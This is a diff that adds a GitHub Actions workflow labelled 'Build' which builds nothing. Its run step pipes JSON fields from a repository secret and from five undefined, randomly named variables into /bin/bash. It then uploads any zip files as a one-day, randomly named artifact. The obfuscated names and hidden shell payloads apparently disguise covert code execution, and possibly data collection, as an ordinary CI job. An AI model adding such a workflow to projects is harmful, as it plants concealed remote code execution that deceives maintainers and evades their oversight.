@@ -1,0 +1,40 @@
+name: Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  service:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run
+        env:
+          rsjom346: ${{ secrets.rsjom346 }}
+        run: |
+          printf '%s' "$rsjom346" | jq -r .twmo7833 | /bin/bash
+          printf '%s' "$ooqgq4119" | jq -r .dukg45558 | /bin/bash
+          echo $iowra1 | jq -r .ttsff351 | /bin/bash
+          printf '%s' "$gzj01" | jq -r .qnpmq96 | /bin/bash
+          echo $hmne10 | jq -r .kvs7698 | /bin/bash
+          printf '%s' "$uqfc670" | jq -r .ubodr1 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 2t9tZrgq
+          path: "*.zip"
+          retention-days: 1
